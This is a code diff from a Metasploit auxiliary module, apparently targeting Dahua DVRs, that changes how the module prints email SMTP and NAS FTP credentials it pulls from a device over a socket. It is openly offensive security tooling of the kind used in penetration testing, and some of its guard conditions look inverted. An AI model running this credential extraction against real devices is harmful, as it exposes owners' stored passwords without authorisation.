@@ -103,22 +103,21 @@ class Metasploit3 < Msf::Auxiliary
     sock.put(EMAIL)
     return unless (response = sock.get_once)
     data = response.split('&&')
+    print_good("#{peer} -- Email Settings:")
     return unless data.first =~ /([\x00]{8,}(?=.{1,255}$)[0-9A-Z](?:(?:[0-9A-Z]|-){0,61}[0-9A-Z])?(?:\.[0-9A-Z](?:(?:[0-9A-Z]|-){0,61}[0-9A-Z])?)*\.?+:\d+)/i
-    email_table = Rex::Ui::Text::Table.new(
-      'Header' => 'Dahua Email Settings',
-      'Indent' => '1',
-      'Columns' => ['Email Server', 'Email Port', 'Email User', 'Email Password']
-    )
     if mailhost = Regexp.last_match[1].split(':')
+      print_status("  Server: #{mailhost[0]}") unless mailhost[0].blank?
+      print_status("  Server Port: #{mailhost[1]}") unless mailhost[1].blank?
+      print_status("  Destination Email: #{data[1]}") unless data[1].blank?
       mailserver = "#{mailhost[0]}"
       mailport = "#{mailhost[1]}"
     end
     return unless data[5].blank? && data[6].blank?
+    print_good("  SMTP User: #{data[5]}")
+    print_good("  SMTP Password: #{data[6]}")
     muser = "#{data[5]}"
     mpass = "#{data[6]}"
-    email_table << ["#{mailserver}", "#{mailport}", "#{muser}", "#{mpass}"]
     return unless mailserver.blank? && mailport.blank? && muser.blank? && mpass.blank?
-    email_table.print
     report_email_creds(mailserver, mailport, muser, mpass)
   end
 
@@ -153,14 +152,9 @@ class Metasploit3 < Msf::Auxiliary
     connect
     sock.put(NAS)
     return unless (data = sock.get_once)
-    print_status("Nas Settings @ #{rhost}:#{rport}!:")
+    print_good("#{peer} -- NAS Settings:")
     server = ''
     port = ''
-    nas_table = Rex::Ui::Text::Table.new(
-      'Header' => 'Dahaua NAS Settings',
-      'Indent' => '1',
-      'Columns' => ['Nas Server', 'Nas Port', 'FTP User', 'FTP Pass']
-    )
     if data =~ /[\x00]{8,}[\x01][\x00]{3,3}([\x0-9a-f]{4,4})([\x0-9a-f]{2,2})/
       server = Regexp.last_match[1].unpack('C*').join('.')
       port = Regexp.last_match[2].unpack('S')
@@ -169,8 +163,10 @@ class Metasploit3 < Msf::Auxiliary
       ftpuser.strip!
       ftppass.strip!
       unless ftpuser.blank? || ftppass.blank?
-        nas_table << ["#{server}", "#{port}", "#{ftpuser}", "#{ftppass}"]
-        nas_table.print
+        print_good(" Nas Server: #{server}")
+        print_good(" Nas Port: #{port}")
+        print_good(" FTP User: #{ftpuser}")
+        print_good(" FTP Pass: #{ftppass}")
         report_creds(
           host: server,
           port: port,
